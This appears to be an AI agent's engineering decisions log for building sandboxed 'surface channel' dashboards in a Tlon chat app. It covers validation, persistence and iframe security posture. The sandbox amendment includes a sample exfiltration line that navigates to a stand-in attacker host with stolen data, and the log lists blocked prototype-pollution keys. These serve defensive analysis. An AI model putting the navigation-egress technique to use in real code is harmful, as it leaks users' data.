# Surface Channels v0 — Session 1 decisions log

Working artifact for the surface-channels session described in
`surface-channels-handoff-prompt.md` (scope) and `surface-channels-plan.md`
(semantics). Every judgment call, deviation, and seam left for later gets a
line here.

## Ground-truthing report (step 1)

All eight claims verified against this checkout (b4cbe79d02). None failed; no
STOP condition hit.

1. **Post kind head must equal nest kind — VERIFIED.**
   `desk/app/channels-server.hoon:1086` (`ca-c-post` `%add` arm):
   `?>  =(kind.nest -.kind.essay.c-post)`. So `/chat/surface/...` kinds are
   valid in a `%chat` channel; a bare `/surface/...` kind would fail the
   assert. Note: the `%edit` arm (line 1106) does _not_ re-check the kind
   head; only `%add` does.
2. **Channel creation requires group admin — VERIFIED.**
   `desk/app/channels-server.hoon:1009–1020` (`can-nest`): looks up the
   creating ship's seat and requires a non-empty intersection with the
   group's admin role set; membership alone fails.
3. **TS post writers hardcode the kind — VERIFIED.**
   `packages/api/src/client/apiUtils.ts:229–261` (`toPostEssay`): kind is
   derived solely from `channelType` (`/diary`, `/heap`, `/chat`). Callers:
   `sendPost` (`postsApi.ts:196`) and `editPost` (`postsApi.ts:283`). The DM
   branch of `sendPost` separately hardcodes `/chat` (`postsApi.ts:179`).
4. **Config/payload module location — VERIFIED.**
   `packages/api/src/client/channelContentConfig.ts` holds
   `ChannelContentConfiguration`, `StructuredChannelDescriptionPayload`, and
   the renderer/draft-input registries (`allCollectionRenderers`,
   `allDraftInputs`, `allContentRenderers`).
5. **`JSONValue` is scalar-only — VERIFIED.**
   `packages/api/src/types/JSONValue.ts:1` (`number | string | boolean`),
   duplicated at `packages/api/src/urbit/channel.ts:308`. Unsuitable for
   recursive state; new `Json`/`JsonObject` types required, existing type
   left untouched.
6. **Sync extracts two fields; edits reconstruct from known fields —
   VERIFIED (the data-loss bug is real).**
   Read side: `packages/api/src/client/groupsApi.ts:1985` and `:2029`
   destructure only `description` + `channelContentConfiguration` from the
   decoded payload. Write side:
   `packages/shared/src/store/channelActions.ts:407–410` re-encodes the
   description from `channel.description` + `channel.contentConfiguration`
   only — a title/permissions edit through `updateChannel` would erase any
   other payload key (e.g. `surfaceSpec`). Notably
   `StructuredChannelDescriptionPayload.decode` itself already returns the
   raw parsed object (unknown keys survive decode); the loss happens at the
   extraction/reconstruction call sites.
7. **Post-blobs playbook — VERIFIED.**
   `docs/tlon-apps/post-blobs.md` exists with the versioning rule (design
   rule 1), registry-as-source-of-truth (rule 2), and unknown-entry
   degradation to `{ type: 'unknown' }` (rule 6). Registry lives at
   `packages/api/src/client/content-helpers.ts`
   (`postBlobDataEntryDefinitions`); the a2ui entry shows the sanctioned
   pattern for registering a schema defined in its own module
   (`A2UI.blobEntrySchema`).
8. **Edit state and sequence numbers in the client post model — VERIFIED.**
   Wire: `ub.Post.revision?: string` (`packages/api/src/urbit/channel.ts:135`);
   the Hoon `%edit` arm bumps `rev` (`channels-server.hoon:1122`). Client:
   `isEdited: 'revision' in post && post.revision !== '0'`
   (`packages/api/src/client/postsApi.ts:1357`) — only the boolean is
   persisted, not the raw counter, which is sufficient for the reducer's
   "reject any edited surface post" rule. `sequenceNum` comes from
   `post.seal.seq` (`postsApi.ts:1339–1342`), persisted on the post row
   (`packages/shared/src/db/schema.ts:1304`); replies have none; tombstones
   keep `seq` (`ub.PostTombstone`, `channel.ts:128`).

## Decisions

- **D1: Working docs are committed on this branch.** The handoff explicitly
  makes `DECISIONS.md` a review artifact alongside the diff, so it is
  committed (unlike the usual repo-root scratch-doc exclusion). The handoff
  prompt and plan stay untracked.
- **D2: Commit cadence.** Local commits per handoff step, as instructed; no
  pushes, no PR — those remain Patrick's.
- **D3: Kind-tail allowlist is the exact three tails** (`surface/spec`,
  `surface/event`, `surface/snapshot`), not a `surface/*` pattern — the most
  constrained reading of "allowlist: surface tails only", and the plan
  defines exactly three post kinds (§4.2–4.4). Extending the const list is
  trivial if a fourth kind appears.
- **D4: Kind tails are chat-only and top-level-only.** `toPostEssay` throws
  on a tail outside `channelType === 'chat'` (surface channels are `%chat`
  channels, §3); reply writers reject tails (replies carry no kind on the
  wire). DM `sendPost` rejects tails before poking.
- **D5: `editPost` also takes `kindTail`.** The Hoon `%edit` arm replaces
  the essay wholesale and does _not_ re-assert the kind head (only `%add`
  does — see ground-truthing #1), so an edit without the original tail would
  silently rewrite a surface post's kind to `/chat`. Callers editing a
  surface post pass the tail back in, mirroring the existing `botProfile`
  convention. (Reducer-side, edited surface posts are retracted regardless.)
- **D6: Live-ship round-trip VERIFIED** (end of session, local rube
  fakeships via `./start-playwright-dev.sh`, then torn down). On a fresh
  `chat/~zod/surface-rt` channel: a post with kind `/chat/surface/event`
  and a `surface-event` blob was accepted — the scry returns it with
  `seal.seq = 1`, `revision = 0`, and the blob byte-identical. A control
  post with bare kind `/surface/event` never materialized (rejected by the
  server; the channel still held exactly one post). Nuance worth keeping:
  the eyre poke ack only means the local `%channels` agent accepted the
  action — the kind-head assert fires in `%channels-server` on the
  forwarded poke, so acceptance must be judged by whether the post
  appears, not by the eyre ack (the bad-kind poke was eyre-acked and then
  dropped). The wire shape poked is exactly what `channelPostAction`
  produces from `sendPost({kindTail})` (asserted in the kind-tail unit
  tests), so the TS-layer construction and the server acceptance compose.
  Remaining for a human: none for spike 4; old-client visual degradation
  (fallback text as inert chat message) is covered by the blob registry's
  unknown-entry tests rather than a rendered check.
- **D7: Forbidden keys are rejected in surface JSON values too, not just
  pointer segments.** §7 forbids `__proto__`/`constructor`/`prototype` only
  as path segments; `Json` validation also rejects them as object keys
  anywhere. No reducer-reachable state can contain them anyway (ops can't
  name them), so this only rejects hostile hand-crafted snapshots/specs —
  and keeps prototype-polluting keys out of any code that indexes state.
- **D8: Depth-cap semantics.** "JSON depth 16" = container nesting: a value
  inside more than 16 nested arrays/objects is invalid; tested at 16 vs 17.
  `applyOp` additionally refuses any write whose path depth + value depth
  would nest state beyond 16, so reduced state always remains valid — and
  therefore snapshottable — under the same cap.
- **D9: The `Op` wire shape** (the plan uses `Op[]` without defining it) is
  `{ op: 'set'|'del'|'append', path, value? }` with `value` required for
  set/append. Recorded as an interface consumers must follow.
- **D10: `$actor` substitution semantics.** Segment position: only a segment
  that is _exactly_ `$actor` substitutes (with the plain ship string; RFC
  escaping applies only when formatting back to path text); a segment merely
  containing `$actor` invalidates the op — treating it literally could
  silently collapse per-user state into shared state. Value position: any
  string _exactly_ `$actor` anywhere in the value tree substitutes (needed
  for `append`-keyed records per §4.3's replay guidance); substrings stay
  literal. Host ops (no actor): any `$actor` occurrence in path or value
  invalidates the op, per §7.
- **D11: Pointer write semantics details.** Writes never index into arrays
  (any array hit during traversal invalidates the op; `append`'s final
  target must be an existing array). `del` through a scalar is a no-op
  ("missing path"), `del`/`set` through an array is an invalid op. Numeric
  segments are ordinary object keys when the container is an object.
  Property reads are own-property only (`toString` et al. read as absent).
  The 200-char path cap applies to the declared path text, pre-substitution.
- **D12: `fast-check` added as a packages/api devDependency** — the handoff
  requires property tests and the workspace had no property-testing library.
- **D13: `applyOp` validates op values itself** (`isJson`) even though
  schemas validate them upstream, so the pointer layer is total against
  hostile values on its own. Internal write results are wrapped
  (`{next}`/`{error}`) so state containing a literal `error` key can't be
  misread as failure (caught by tsc during implementation; regression
  test added).
- **D14: Caps interpretation.** KB = 1024 bytes; sizes measure the UTF-8
  JSON serialization of the _validated_ (unknown-keys-stripped) value — the
  raw blob string is independently bounded by `%channels-server`'s per-post
  `size-limit`. "Spec metadata total 32 KB" is enforced as the whole
  serialized spec (slightly stricter than the itemized list; simpler).
- **D15: Enforcement split for entry validity.** Caps and shape violations
  fail schema validation → the whole blob entry degrades to
  `{type:'unknown'}` (per the §7 caps table: "violations skip the entry").
  Pointer path grammar violations and `$actor` misuse are checked per-op at
  reduce time → only that op is skipped, remaining ops apply (per §7's
  Paths paragraph). Schemas therefore validate `path` only as a string.
- **D16: Invoke entries cannot smuggle ops** — zod parsing strips unknown
  fields, so a crafted invoke carrying an `ops` array validates but loses
  the ops; the reducer resolves ops exclusively from the current spec.
- **D17: Payload decode split.** `decode` is now lossless (no defaults
  injection, unknown keys preserved) so `encode(decode(x))` is
  byte-equivalent; the legacy hydrating behavior moved verbatim to
  `decodeWithDefaults`, used by the three in-package rendering call sites.
  Two deliberate behavior changes in `decode` for non-object JSON: a
  description that parses to a scalar ("5", "true") or an array is now kept
  as a plain-text description (legacy dropped scalars to `{}` and returned
  arrays as the payload). The legacy quirk where showAuthors/showReplies
  defaults stick only to object-form collection renderers is preserved in
  `decodeWithDefaults` and pinned by test.
- **D18: Validated-spec views strip unknown spec keys.** `SurfaceSpecSchema`
  accepts unknown keys but its parsed output drops them (zod default).
  Consumers that persist or re-encode the spec must carry the RAW value
  from the decoded payload, not the validated view — flagged for the
  packages/shared persistence work.
- **D19: Reducer input contract.** Only posts with a numeric `sequenceNum`
  fold (unsynced optimistic posts and replies never do, so every client
  folds the same server-sequenced set). A post may carry multiple surface
  entries; they process in blob order within the post's sequence slot.
  `hostShip` is a caller-supplied parameter derived from the channel id,
  never from post/blob content. The reducer consumes the shared
  `parsePostBlob` union parser (playbook rule 2), filtering to entries
  whose `surfaceId` matches the spec.
- **D20: State cap enforcement is op-granular and uniform.** §7 says
  "further `append`s refused" at 128 KB; sets can grow state the same way,
  so ANY op whose result exceeds the cap is refused (op skipped, state
  unchanged, `stateFull` flag set for the "dashboard full" UI), and later
  shrinking ops still apply. Uniform across clients ⇒ still convergent.
  Size is re-measured per applied op (O(state) per op) — fine at these
  caps; optimize only if profiling ever says so.
- **D21: packages/shared suite RESOLVED and green** (initially failed with
  `ERR_DLOPEN_FAILED`, NODE_MODULE_VERSION 132 vs 127). Root cause, from a
  dedicated investigation: this worktree's hoisted
  `node_modules/better-sqlite3` binary had been rebuilt for **Electron's
  ABI (132)** by `apps/tlon-desktop`'s `postinstall: electron-builder
install-app-deps` — under `nodeLinker: hoisted` that clobbers the single
  shared copy every package uses, and `pnpm rebuild better-sqlite3` is a
  no-op on it (not a direct root dep). Fix: `npm rebuild better-sqlite3`
  from the worktree root — exactly what the repo's own root `test`/
  `test:ci` scripts already run first, so this is the sanctioned recovery,
  and running tests via the root scripts self-heals it. After the fix:
  `sync.test.ts` 18/18, full packages/shared suite **43 files / 550 tests,
  all green** — consumer-side verification of the lossless `decode` change
  passes (`sync.test.ts` exercises `encode` plus the `toClientChannel`
  path). Standing gotcha for any worktree: every `pnpm install` re-breaks
  the binary for plain-Node runs via the desktop postinstall.

## Session 2 decisions (packages/shared)

- **D22: Two persisted columns, not one.** `surface_spec` (raw JSON text of
  the spec subtree — the plan's first-class field, what `readSurfaceSpec`
  and the hydration layer read) AND `description_payload` (the channel's
  `meta.description` verbatim). The second is required by the plan's "edit
  paths reconstruct from the full decoded payload": `description` and
  `contentConfiguration` are lossy extractions, so payload-level unknown
  keys can only survive edits if the verbatim payload string is available
  locally to decode→modify→encode. Both are extracted in one place
  (`StructuredChannelDescriptionPayload.rawPersistenceFields`, used by
  `toClientChannel` and `toClientChannelFromPreview`); they cannot drift
  because both derive from the same `meta.description` in the same call.
  DM/club channels are out of scope (no groups description payload; they
  cannot be surface channels).
- **D23: `readSurfaceSpec` semantics** (in `packages/api` surface module so
  client and tlon-skill share it): `absent` for null/empty/stored-`null`;
  `version-too-new` iff the declared `version` is a finite _integer_ >
  `SUPPORTED_SURFACE_SPEC_VERSION` — checked BEFORE schema validation, so a
  future-version spec reads "update to view", never "invalid definition";
  everything else that fails `SurfaceSpecSchema` is `invalid` (non-integer
  or non-numeric declared versions included). The `valid` arm returns the
  validated (stripped) view — fine for behavior, never for persistence.
- **D24: `applyMetadataEdit` semantics** (edit reconstruction, in the SCDP
  namespace): start from the decoded stored payload, overlay `description`
  always and `channelContentConfiguration` only when it _semantically
  differs_ from the stored payload's hydrated view — extracted configs are
  defaults-hydrated, and overlaying an unchanged one would materialize
  defaults into the cell on every title edit. Serialization is minimal: an
  empty payload is `''`; a payload holding only a plain description is the
  bare string (no spuriously grown structure) unless that string would
  itself parse as a payload object, in which case it's wrapped. This also
  quietly fixes the legacy behavior where every edit converted plain
  descriptions into `{"description": ...}` JSON.
- **D25: Ship canonicalization boundary** (`canonicalShipId` in
  `packages/shared/src/store/surface/adapter.ts`): leading `~`, lowercase,
  trimmed (`preSig(desig(s).toLowerCase())`), applied to BOTH the channel
  host (from the channel id) and every post author before the reducer sees
  them, so host checks and `$actor` keys cannot diverge on sig/case. The
  reducer itself stays verbatim-compare (ratified Session 1 semantics);
  this boundary is part of the security invariant. Non-string authors pass
  through untouched and are skipped by the reducer's own guards.
- **Correction during step 3:** my first draft of the edit-losslessness
  tests accidentally overwrote the pre-existing
  `channelActions.test.ts` (17 tests). Caught via the suite-count drop,
  restored from HEAD, and the new tests were merged in following that
  file's own conventions — the restored originals also now exercise the
  rewritten `updateChannel`, all green.
- **D26: Hydration folds by re-reduction, not patching.** The data layer
  (`hydrateSurface` + `useSurfaceHydration`) re-runs the full fold whenever
  the `posts`/`channels` tables invalidate the query. §6's mutation
  semantics make true incremental patching unsound without change
  detection (a deletion above the boundary, a snapshot retraction, or a
  revision transition each require refolding), and the fold is cheap at
  the §7 caps because compaction bounds the window. The batch reducer's
  determinism is what makes this convergent. A patch-based fast path
  remains a later optimization, behind the same result shape.
- **D27: Coverage rule for the backward-paging loop.** With the loaded
  window contiguous `[oldest..newest]`, the fold is presentable iff
  `oldest === 1` or the reduction's `baseSnapshotSeq >= oldest - 1` (all
  events above the effective snapshot boundary are inside the window). A
  preserving spec that pages to sequence 1 without a current-revision
  snapshot is `migration-pending`; anything short of coverage is
  `partial`, which carries no state (a partial fold is never presented as
  current). Remote backfill is an injected function (the loop knows
  paging, not the network) with a `maxPages` budget (default 40 pages of 50) as a runaway bound.
- **D28: Bundle cache substrate is a SQLite table** (`surface_bundles`).
  The repo's media caching is platform-level (expo-image on native, the
  browser cache on web) — nothing `packages/shared` can drive on all three
  platforms — while the shared SQLite database already exists everywhere,
  and bundles are small text (≤ 256 KB). Byte budget:
  `SURFACE_BUNDLE_CACHE_MAX_BYTES = 16 MB` (64 max-size bundles). LRU
  eviction runs inside the insert transaction, ordered by `lastAccessedAt`
  (ties broken by sha256), never evicting the row just written;
  access-time touches declare no table effects so cache reads don't
  invalidate subscribers. Hashing uses `@aws-crypto/sha256-js` (new direct
  dep of shared: pure JS, RN-safe; already in the lockfile transitively
  via the api package's S3 client). Verify-on-read makes a corrupt entry a
  miss (delete + refetch); fetched bytes are hash-verified BEFORE
  store-or-return, and fetch is injected — the cache knows hashes and
  budgets, never URLs or HTTP.

## Notes for M1's remaining consumers

Everything below consumes `packages/api/src/client/surface/` (exported from
`@tloncorp/api`'s client barrel) and
`StructuredChannelDescriptionPayload` in `channelContentConfig.ts`.

### packages/shared (persistence + sync)

- **Persist the RAW spec, validate at read.** `decode(description)` returns
  the payload with `surfaceSpec` untouched; `SurfaceSpecSchema.parse`
  strips unknown keys (D18), so the persisted channel field should carry
  the raw value (e.g. as JSON text) and readers validate through
  `StructuredChannelDescriptionPayload.surfaceSpec(decoded)`.
- **Edit paths become decode→modify→encode.** `updateChannel`
  (`packages/shared/src/store/channelActions.ts:407`) must decode the
  _current on-ship description_ with the now-lossless `decode`, overwrite
  only the fields being edited, and re-encode — never rebuild from known
  fields. The required integration test: title/privacy/content-config edits
  each leave `surfaceSpec` byte-identical.
- **Reducer wiring.** `reduceSurface({ spec, hostShip, posts })`; `posts`
  needs only `{ authorId, sequenceNum, isEdited, isDeleted, blob }` —
  `db.Post` satisfies this structurally. `hostShip` comes from
  `parseGroupChannelId(channelId).host`, never from post content.
- **Bundle cache** keys off `spec.bundle.sha256`
  (`SurfaceBundleRefSchema`); verify-on-read, LRU.

### packages/surface-shell + renderer (packages/app)

- Renderer states map from reducer output: `status: 'migration-pending'` →
  the migration-pending screen; `stateFull: true` → "dashboard full";
  bundle fetch/verify and `shellVersion` gating happen host-side around
  `spec.bundle` before any sandbox involvement.
- Invokes post via
  `sendPost({ channelId, kindTail: 'surface/event', blob:
JSON.stringify([entry]), ... })` where `entry` is a `surface-event`
  invoke arm tagged with the **rendered** `specRevision`. Writers are
  responsible for including fallback Story content so pre-surface clients
  degrade to inert chat messages (plan §4) — the entry schemas don't
  enforce that.
- `reduceSurface` is a batch fold; re-running on each post-set change is
  cheap at the §7 caps. An incremental fold API is a deliberate seam for
  later, not built now.

### Interfaces I'm least sure about (flag for review)

- The `Op` wire shape (D9) — the plan never pins it; `tlon-skill` and
  templates must adopt this shape or change it _here_ first.
- `reduceSurface`'s result carries `baseSnapshotSeq` and fold counters; the
  §6 hydration loop may want more (e.g. newest folded seq for the
  watermark). Extend the result type rather than recomputing outside.
- Author identity is compared verbatim (`authorId === hostShip`); callers
  must pass canonical `~ship` strings. No desig/case normalization happens
  in the reducer.
- Multiple surface entries per post are folded in blob order (D19). If one
  entry per post should be the rule, enforce it at the writers, not the
  reducer.

## Notes for Session 3+ (`packages/surface-shell` and the renderer)

What Session 2 built in `packages/shared` (all exported from the store
barrel via `store/surface/`), and the exact shapes the shell/renderer
sessions consume:

### Read APIs

- **Spec:** `db.Channel.surfaceSpec` is raw JSON text; read it ONLY through
  `readSurfaceSpec(raw)` (from `@tloncorp/api`), which returns
  `{status:'absent'} | {status:'invalid'} | {status:'version-too-new',
version} | {status:'valid', spec}`. Renderer mapping: `invalid` → the
  "invalid definition" screen, `version-too-new` → spec-level "update to
  view". Never fall back to the chat renderer for either (§6 step 1). The
  bundle's `shellVersion` gate is separate and renderer-side, against
  `spec.bundle.shellVersion` vs the shell's `SHELL_VERSION`.
- **Hydration:** `useSurfaceHydration({ channelId, enabled?, pageSize?,
maxPages? })` → a react-query result whose `data` is
  `SurfaceHydrationState`:
  `{ status: 'absent'|'invalid'|'version-too-new'|'migration-pending'|
'partial'|'hydrated', spec?, specVersion?, state?, stateFull?,
reduction?, oldestLoadedSeq?, newestLoadedSeq? }`.
  `state` exists only when `hydrated`; `partial` is the loading screen and
  deliberately carries no state; `stateFull` drives "dashboard full".
  Live posts/deletions/spec changes re-run the fold automatically
  (posts+channels table invalidation). Non-React consumers (tlon-skill's
  `surface state`) can call `hydrateSurface(...)` or drop to
  `reduceSurfaceChannel({channelId, spec, posts})` with their own post
  source.
- **Ship comparisons:** any surface-related identity comparison in the
  renderer (e.g. "is the viewer the host") must go through
  `canonicalShipId` so it can't diverge from the reducer's fold.

### Bundle cache

- `getOrFetchBundle(spec.bundle, fetcher)` →
  `{status:'ok', content, fromCache} | {status:'unavailable', reason:
'fetch-failed'|'oversize'|'hash-mismatch'}` — `unavailable` is the
  renderer's "bundle unavailable" state with a retry affordance. The
  `fetcher: (ref: SurfaceBundleRef) => Promise<string>` is supplied by
  `packages/app` (assetRef → bundle text over whatever transport);
  the cache verifies hashes on both paths, so the caller never needs to.
  Budget constant: `SURFACE_BUNDLE_CACHE_MAX_BYTES` (16 MB).

### Writer expectations (for the invoke path and tlon-skill)

- Invokes: `sendPost({ channelId, kindTail: 'surface/event', blob:
JSON.stringify([entry]), content: <fallback Story> })` with the entry
  tagged with the RENDERED `specRevision`. One surface entry per post
  (writer rule); fallback text is the writer's responsibility; success is
  confirmed by observing the post, never the poke ack.

### Least sure about (flag for review)

- `useSurfaceHydration` exposes the raw react-query result; if the
  renderer wants a flattened `{status, state}` selector, add it over this.
- `partial` withholds state entirely. If UX wants labeled-stale content
  during backfill, that is a deliberate semantics change to request, not a
  bug fix.
- Table-level invalidation re-runs active folds on ANY posts-table write
  (not just this channel's). Fine at current scale; if it ever shows up in
  profiles, per-channel keys need a new invalidation channel.
- The §8 unread/activity exclusion for surface channels is NOT built here
  — it keys off the channel's content configuration and belongs with the
  renderer wiring.
- The migration baseline was regenerated twice this session (renamed
  `0000_*.sql` is the expected diff shape per the repo's reset pattern).

## Session 3 decisions (packages/surface-shell)

- **D29: zod placement.** The prompt requires zod protocol schemas AND a
  runtime dependency set of exactly preact/htm/chart.js. Resolution: zod is
  a devDependency confined to `src/protocol/schemas.ts` (the canonical
  host-side validators, exported via `@tloncorp/surface-shell/protocol`);
  the in-sandbox shell validates its inbound direction with the
  dependency-free guards in `protocol/guards.ts`, held in agreement with
  the schemas by test. Enforcement is mechanical: `check:deps` allows zod
  only in schemas.ts and forbids artifact code from importing the protocol
  barrel or schemas; the build check additionally asserts the artifact
  contains no zod markers.
- **D30: Token mapping choices.** Codegen evaluates
  `@tloncorp/ui/config` (TS source importing react-native/tamagui) via
  vite SSR with tiny shims aliased in (`ssr.noExternal` so aliases apply).
  Mapped: 15 theme color roles (bg/bg-secondary, text ×3, border ×3,
  positive ×3, negative ×3, shadow) for **light and dark only**; spacing
  2xs–4xl; radius xs–2xl; system font family (already a system stack — no
  font-file delivery, that's the M0 native spike) plus text sizes xs–xl,
  line heights xs–l, weights 400/500. Deliberately unmapped: dracula and
  gruvbox themes, app-specific roles (unread dots, system notices,
  overlays, media scrim), zIndex, negative-space tokens. Additions are
  additive within a shell major. Light doubles as the `:root` default;
  the harness switches themes via `data-theme` on the document element.
- **D31: Entry-point binding (templates inherit this).** The shell loads
  FIRST in the sandbox document and exposes `globalThis.surface`; the app
  bundle is a plain script (no imports/exports) that calls
  `surface.register({ render })`. Registration is order-tolerant: init
  before bundle or bundle before init both work. The app-facing API is
  `html` (htm bound to preact h), `h`, `primitives`, `Chart` (vendored,
  artifact-only), `register`, `invoke(actionId) → boolean`, and
  `canInvoke()` — read state (render arg) and invoke declared actions are
  the only capabilities; the rest is presentation tooling.
- **D32: Bundler and determinism.** vite lib-mode IIFE (the workspace's
  bundler; packages/editor is the precedent for a self-contained webview
  artifact), one `surface-shell.js` + one `surface-shell.css`, no
  sourcemaps, no name hashes, `minify: false` for auditability (the
  artifact is injected locally; flip to esbuild minify later if size ever
  matters — it stays deterministic). `check:determinism` builds twice into
  temp dirs and compares sha256s: **byte-identical, no documented gap**.
  It also asserts no dynamic imports and no zod in the artifact. Exact
  pins: preact 10.29.8, htm 3.1.1, chart.js 4.5.1 ("vendored" = pinned
  exact + inlined into the artifact; no copied-source vendor/ dir).
  `dist/` is gitignored (editor convention); consumers build it.
- **D33: Mirrored-type tracking.** `protocol/types.ts` structurally mirrors
  the api's `Json`/`JsonObject`, the SurfaceSpec subset the shell reads
  (surfaceId, specRevision, title, actions map), and the ActionId
  constraints (≤64, /^[a-z0-9-]+$/). These MUST track
  `packages/api/src/client/surface/{json,schemas}.ts` by hand — any api
  change to those shapes requires a matching shell change (and a shell
  major if behavior shifts). Cross-references sit in both files.
- **D34: Harness semantics.** `invoke` sends only spec-declared actionIds
  (own-property lookup — inherited names refuse) and is permission-gated
  live; permission changes re-render so apps using `canInvoke()` refresh.
  App exceptions render the BrokenState primitive and report a
  length-bounded (1024) error over the bridge, edge-triggered (one report
  per failure streak); invalid host messages report `phase: 'bridge'`
  errors and never throw; a throwing transport is swallowed. Chart.js in
  happy-dom: no canvas 2d context — Chart constructs inert (ctx null)
  without throwing; documented limitation, real draw checks belong to the
  webview sessions.
- **Process correction:** `check:deps` was failing on test files' `vitest`
  import during steps 4–5 and the failure hid behind a piped `tail`; fixed
  by allowing `vitest` in `*.test.*` files only (all other rules still
  apply to tests) and committed as its own fix. Checks are now run
  unpiped before each commit.

## Notes for Session 4+ (sandbox hosts + renderer, and the authoring session)

### Consuming the artifact (packages/app)

- Build: `pnpm build` in `packages/surface-shell` → `dist/surface-shell.js`
  (IIFE, self-contained) + `dist/surface-shell.css`. Export paths:
  `@tloncorp/surface-shell/artifact/surface-shell.js` and `.css`. `dist/`
  is NOT committed — wire the build into the workspace build order (e.g.
  root `build:packages`) when packages/app starts embedding it.
- Sandbox document shape: `<style>{css}</style><script>{shell js}</script>
  <script>{app bundle}</script>` inside the CSP'd srcdoc/webview. The
  shell creates its own `.tsh-root` container in `<body>`, sets
  `data-theme` on the document element, installs its message listener,
  and posts `ready` immediately — the host may send `init` any time after
  injection (before or after the bundle script runs).
- Init contract (host→shell): `{type:'init', protocolVersion: 1, spec,
state, theme: 'light'|'dark', canInvoke}` — `spec` may be the full raw
  spec (unknown fields pass through; the shell reads
  surfaceId/specRevision/title/actions). Then `{type:'state'}` per
  reduction update, `{type:'theme'}`, `{type:'permission'}`.
- Host inbound validation: run EVERY message from the sandbox through
  `ShellToHostMessageSchema` (`@tloncorp/surface-shell/protocol`) — it is
  strict by design; reject, don't strip. `invoke.specRevision` is the
  revision the shell rendered — pass it into the surface-event entry.
- Transport: the shell posts JSON **strings** (parent.postMessage or
  ReactNativeWebView.postMessage) and accepts strings or structured data
  inbound. Open question for the host session: on some RN platforms the
  webview delivers inbound messages via a `document` event rather than
  `window` — verify per platform and adjust `detectTransport` (shell
  change) if needed.
- Theme: only light/dark exist in the shell. The host maps exotic app
  themes (dracula, gruvbox) to the nearer of the two until shell tokens
  grow variants.

### tlon-skill (authoring session)

- Node entry: `@tloncorp/surface-shell/node` →
  `runShellFixture({window, bundleSource, spec, state, theme?, canInvoke?,
chart?})` returning `{root, api, messages, errors(), invokes(), html(),
sendState(), setPermission(), setTheme(), click()}`. The DOM window is
  injected — bring your own happy-dom (`new Window()`); the shell package
  keeps happy-dom dev-only. This runs the REAL harness source; use it for
  the publish gate's smoke render.
- Template/bundle convention (inherited from D31): a single plain script,
  no imports/exports, that calls `surface.register({ render })`; compose
  `surface.primitives` via `surface.html`; call `surface.invoke(actionId)`
  from handlers and `surface.canInvoke()` for disabled states. The poll
  fixture (`fixtures/poll/`) is the canonical exemplar; the fixture
  runner accepts any `app.js + spec.json + state.json` directory — the CI
  template-render job is "add template directories to that sweep".

### Least sure about (flag for review)

- RN webview inbound event target (window vs document) — see above; may
  need a shell-side transport tweak once the native host exists.
- `surface.Chart` is typed `unknown` (boundary honesty); the templates
  session should decide the ergonomics story before generating chart code.
- The artifact is ~500 KB unminified (~110 KB gzip). If embedding budgets
  care, `minify: 'esbuild'` stays deterministic — a deliberate flip, not a
  default.
- happy-dom v20 with vitest 1.x works in this package; the workspace
  otherwise has no happy-dom pin to conflict with.

## Session 4 decisions (packages/app renderer + sandbox hosts)

- **D35: Artifact embedding is a generated JSON-literal module.** surface-shell's
  build now emits `dist/artifactStrings.{js,d.ts}` (`shellArtifactJs`,
  `shellArtifactCss`, `shellArtifactVersion`) via `JSON.stringify` string
  literals — byte-exact by construction, verified against the dist files.
  Exported as `@tloncorp/surface-shell/artifact-strings`; wired into root
  `build:packages` and a CI build step (mirroring the editor's). The
  embedded artifact is the ONLY shell delivery path — the shell is never
  fetched. (Template-literal embedding was tried first and corrupted
  bytes through escape processing; JSON literals are the fix, not a
  preference.)
- **D36: Web sandbox posture.** `sandbox="allow-scripts"` only (opaque
  origin; no same-origin, forms, popups, downloads, top-nav) + a
  host-injected CSP meta (`default-src 'none'; script-src 'unsafe-inline';
style-src 'unsafe-inline'`) as the resource gate. Outbound
  `postMessage(…, '*')` is deliberate and recorded in-code: no concrete
  targetOrigin can match an opaque origin, so `'*'` is the only working
  value; mitigations are that the host owns the iframe element (srcDoc),
  checks `event.source` against its own `contentWindow` on every inbound
  message, and sends nothing the sandbox doesn't already hold (spec,
  state, theme, permission). `</script` is escaped (`<\/script`) during
  document assembly. A browser-level posture test (`pnpm e2e:sandbox`, no
  ships) exercises this, with the authoritative signal being network-level
  (Playwright `response`/`requestfinished` listeners — `request` fires even
  for CSP-blocked attempts, and `sendBeacon` returns true on queueing).

  **AMENDED (session 4.5, correction of record).** As originally written
  this entry said the posture was "proven" and implied deny-all egress.
  That was an overclaim, and the amendment is the correction of record.
  What the posture test actually proves is exactly seven probed vectors:
  `fetch`, `XMLHttpRequest`, `WebSocket`, image beacon, `sendBeacon`,
  `window.top` access, and `localStorage`. Those are genuinely blocked.

  **Navigation was never probed, and is not blocked.** A bundle calling
  `location.replace('https://attacker/?data=…')` performs egress (the
  request itself) and then runs unpinned code in the frame with no
  injected meta CSP. No `sandbox` token restricts a frame from navigating
  itself; CSP `default-src` governs resource fetches, not navigation;
  `navigate-to` was dropped from CSP3 and never shipped un-flagged. The
  gap was invisible precisely because the missing probe made it
  invisible — a probe set that omits a vector reads as proof the vector
  is closed. Standing rule from this: **a passing posture test may only
  be cited for the vectors it probes**, and claims cite probe lists, not
  suite names.

  Commit `e8a40f8444`'s message ("proven posture") overclaims for the
  same reason. Commit messages are immutable; this amendment is the
  correction of record for it, and for the session 4 report's original
  "fully verified" language (that report has since been revised).

  The resulting posture is stated honestly in the amended plan §5 and
  analysed in `surface-channels-f1-sandbox-egress.md`. Decision taken:
  **Option C** — the publish gate is the primary boundary against
  navigation egress on web now, with the Worker-realm migration as an
  explicit M4 deliverable gating shared-group trust. See D43 for the
  `frame-src` experiment that determines whether web additionally gets
  origin-restricted navigation.

- **D37: One message discipline for both hosts.** `createSandboxSession`
  (platform-agnostic, unit-tested) validates EVERY inbound message
  against the canonical strict schemas (widened invokes rejected, not
  stripped), folds pre-ready updates into the eventual init, re-inits on
  a second `ready` (iframe reload), and cross-checks an invoke's
  `specRevision` against the spec the host initialized the sandbox with —
  mismatch means a stale sandbox, drop and log. Only the actionId crosses
  the boundary outward.
- **D38: The invoke writer lives in `packages/shared`'s store, not api.**
  (The session rule limits api changes to the registry addition; the
  writer is new store surface, not ratified-semantics change.)
  `sendSurfaceInvoke` builds the one-entry `mode: 'invoke'` blob against
  the ratified `SurfaceEventEntrySchema` — stamping `specRevision` from
  the host's own spec, never a message — refuses to post anything that
  fails validation, posts under kind tail `surface/event` with fallback
  Story text ("Used X. Update Tlon to view this dashboard."), and treats
  the poke ack as fire-and-forget: success is the post being observed
  back through the subscription and refolded (§4.3 semantics).
- **D39: Registry additions only.** `tlon.r0.collection.surface`
  (CollectionRendererId.surface) and `tlon.r0.input.none`
